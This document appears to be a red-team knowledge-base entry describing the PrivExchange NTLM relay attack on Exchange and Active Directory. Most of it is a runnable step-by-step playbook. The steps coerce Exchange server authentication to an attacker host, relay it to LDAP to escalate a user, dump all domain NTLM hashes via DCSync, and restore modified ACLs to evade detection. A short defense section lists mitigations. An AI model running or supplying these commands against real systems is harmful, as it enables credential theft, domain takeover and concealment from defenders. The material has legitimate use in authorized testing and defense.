---
id: b563d5dd-4a0e-4bea-b502-4f87d007b906
name: PrivExchange-Attack-with-NTLM-Relay
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:08.058135+00:00'
updated_at: '2023-04-10T20:26:32.331421+00:00'
tactics:
  - '[[Credential Access]]'
  - '[[Defense Evasion]]'
  - '[[Lateral Movement]]'
techniques:
  - '[[Brute Force]]'
  - '[[Use Alternate Authentication Material]]'
sub_techniques:
  - '[[Credential Stuffing]]'
  - '[[Pass the Hash]]'
  - '[[Pass the Ticket]]'
tags:
  - active-directory-attacks
  - privexchange-attack
  - ntlm-relay
  - privilege-escalation
  - exchange-server
commands:
  - '[[commands/git-clone-exchange2domain-repo]]'
  - '[[commands/secretsdump-extract-ntlm-hashes]]'
  - '[[commands/pth-net-get-exchange-servers-group-members]]'
  - '[[commands/ntlmrelayx-escalate-user-via-ldap]]'
  - '[[commands/powerpriv-attack-exchange-server]]'
  - '[[commands/privexchange-run-attack]]'
  - '[[commands/aclpwn-restore-backup]]'
  - '[[commands/exchange2domain-run-full-enumeration]]'
  - '[[commands/exchange2domain-run-dc-user-enumeration]]'
platforms:
  - Windows
  - Active Directory
tools:
  - '[[tools/Impacket]]'
  - '[[tools/PrivExchange]]'
  - '[[tools/PowerPriv]]'
  - '[[tools/ACLPwn]]'
  - '[[tools/Exchange2domain]]'
validated: true
---

# PrivExchange-Attack-with-NTLM-Relay

## Summary

The PrivExchange attack enables an attacker to perform NTLM relay attacks against Microsoft Exchange servers, facilitating privilege escalation and potential domain compromise. It leverages Exchange Web Services (EWS) and requires valid domain user credentials with access to Exchange. This procedure outlines the steps to enumerate Exchange servers, relay NTLM authentication, extract hashes, and escalate privileges using tools like Impacket, PrivExchange, and related scripts.

## Description

In an Active Directory environment with Microsoft Exchange, attackers with low-privileged credentials can exploit the push notification subscription feature in EWS to coerce the Exchange server into authenticating to an attacker-controlled relay point. This allows NTLM relay to a domain controller, enabling ACL modifications for privilege escalation, such as adding users to privileged groups. The attack combines reconnaissance of Exchange group members, hash extraction via DCSync, and restoration of modified ACLs to cover tracks. It targets environments vulnerable to unconstrained delegation and weak NTLM protections, leading to access to sensitive email data, domain admin rights, or full compromise. This technique is effective in legacy setups without EPA (Extended Protection for Authentication) or channel binding enabled.

## Requirements

1. Valid domain user credentials with access to Exchange Web Services (EWS) and ability to authenticate to the domain controller.
2. Network access to the Exchange server, domain controller, and any required ports (e.g., 443 for EWS, 389/636 for LDAP, 445 for SMB).
3. Installed tools: Impacket suite, PrivExchange.py, PowerPriv, ACLPwn.py, and Exchange2domain.py (cloned from respective repositories).
4. Attacker machine with Python 3 and necessary dependencies (e.g., for Impacket).
5. Optional: Listener setup (e.g., netcat) for reverse connections if enumeration involves callbacks.

## Defense

- Enable Extended Protection for Authentication (EPA) and LDAP channel binding on domain controllers to prevent NTLM relay.
- Implement multi-factor authentication (MFA) for Exchange and domain accounts to block stolen credential usage.
- Restrict access to EWS and limit 'Exchange Servers' group membership to necessary service accounts.
- Monitor for anomalous EWS requests (e.g., push subscriptions), NTLM authentication spikes, and LDAP modifications via tools like Microsoft ATA or SIEM rules.
- Disable unconstrained delegation and enforce least privilege for service accounts.

## Objectives

1. Identify Exchange servers and service accounts for targeting.
2. Relay NTLM authentication to escalate privileges on the domain controller.
3. Extract NTLM hashes for pass-the-hash attacks or offline cracking.
4. Achieve domain compromise through elevated access to sensitive data like emails and AD objects.

## Instructions

### Step 1: Clone Exchange2domain Repository

**Context**: Begin by cloning the Exchange2domain tool repository, which is used for enumerating Exchange and domain users via coerced authentications. This sets up the script for subsequent enumeration steps.

**Command** ([[commands/git-clone-exchange2domain-repo]]):
```bash
git clone https://github.com/Ridter/Exchange2domain.git
```

> This command downloads the Exchange2domain tool. Navigate to the cloned directory after execution to run the scripts. Expected output includes confirmation of the clone operation and directory creation.

### Step 2: Enumerate Exchange Servers Group Members

**Context**: Identify members of the 'Exchange Servers' group on the domain controller to target specific servers for the relay attack. This reconnaissance step reveals potential delegation targets.

**Command** ([[commands/pth-net-get-exchange-servers-group-members]]):
```bash
pth-net rpc group members "Exchange Servers" -I dc01.domain.local -U domain/username%password
```

> Using Impacket's pth-net (pass-the-hash net rpc), this queries the group membership remotely. Replace dc01.domain.local with your DC IP/hostname, and domain/username%password with valid credentials. Expected output: A list of computer accounts in the 'Exchange Servers' group, such as 'mail01.domain.local$'.

### Step 3: Run Full Exchange2domain Enumeration

**Context**: Execute the Exchange2domain script to coerce authentications and enumerate all users on the Exchange server and domain. This step sets up a listener for incoming connections and performs comprehensive discovery.

**Command** ([[commands/exchange2domain-run-full-enumeration]]):
```bash
python Exchange2domain.py -ah $_ATTACKER_IP -ap $_LISTEN_PORT -u $_USERNAME -p $_PASSWORD -d $_DOMAIN -th $_DC_IP $_MAIL_SERVER_IP
```

> This runs the full enumeration mode, listening on the specified port for relayed connections. Parameters include attacker IP for callbacks, listen port (e.g., 9001), credentials, domain, DC IP, and mail server IP. Expected output: Enumerated user lists, NTLM hashes if captured, and any successful authentications logged to console.

### Step 4: Run DC User Enumeration with Exchange2domain

**Context**: Perform targeted enumeration of domain controller users (e.g., krbtgt) using Exchange2domain without the full listen setup, focusing on high-value accounts for privilege escalation.

**Command** ([[commands/exchange2domain-run-dc-user-enumeration]]):
```bash
python Exchange2domain.py -ah $_ATTACKER_IP -u $_USERNAME -p $_PASSWORD -d $_DOMAIN -th $_DC_IP --just-dc-user krbtgt $_MAIL_SERVER_IP
```

> This targets specific DC users like krbtgt for hash extraction. Use the same parameter substitutions as above. Expected output: Details on the targeted user, including hashes or access logs if the coercion succeeds.

### Step 5: Perform NTLM Relay for Privilege Escalation

**Context**: Set up the NTLM relay using ntlmrelayx to target LDAP on the domain controller and escalate the relayed user's privileges by adding them to a privileged group.

**Command** ([[commands/ntlmrelayx-escalate-user-via-ldap]]):
```bash
ntlmrelayx.py -t ldap://$_DC_IP --escalate-user $_TARGET_USERNAME
```

> This relays captured NTLM auth from Exchange to LDAP, then escalates the specified user (e.g., add to Domain Admins). Run this alongside a tool coercing auth from Exchange. Expected output: Relay success messages, group membership changes, and any errors if EPA is enabled.

### Step 6: Attack Exchange Server with PrivExchange

**Context**: Use PrivExchange.py to subscribe to push notifications, coercing the Exchange server to authenticate and reveal its NTLMv2 hash for relay.

**Command** ([[commands/privexchange-run-attack]]):
```bash
python privexchange.py -ah $_ATTACKER_IP $_MAIL_SERVER_HOSTNAME -d $_DOMAIN -u $_USERNAME -p $_PASSWORD
```

> This crafts an EWS request to force NTLM auth. Alternatively, for PowerPriv: [[commands/powerpriv-attack-exchange-server]]. Expected output: Captured NTLMv2 hash of the Exchange computer account, printable in hashcat format.

### Step 7: Extract NTLM Hashes with Secretsdump

**Context**: After escalation or hash capture, use secretsdump to perform DCSync and extract NTLM hashes from the domain, including history for cracking.

**Command** ([[commands/secretsdump-extract-ntlm-hashes]]):
```bash
python secretsdump.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_DC_IP -just-dc-ntlm
python secretsdump.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_DC_IP -ntds $_NTDS_FILE -history -just-dc
```

> The first extracts current NTLM hashes via DCSync; the second uses a dumped NTDS.dit for history. Expected output: Hashes in format 'username:rid:lmhash:nthash:::', saved to files like secretsdump.dmp.

### Step 8: Restore ACLPwn Backup

**Context**: After modifying ACLs during escalation, restore the original state to evade detection and maintain stealth.

**Command** ([[commands/aclpwn-restore-backup]]):
```bash
python aclpwn.py --restore $_BACKUP_FILE_PATH
```

> This reverts AD object ACLs from a prior backup. Create backups before modifications using aclpwn.py --dump. Expected output: Confirmation of restored permissions, with no errors indicating successful reversion.
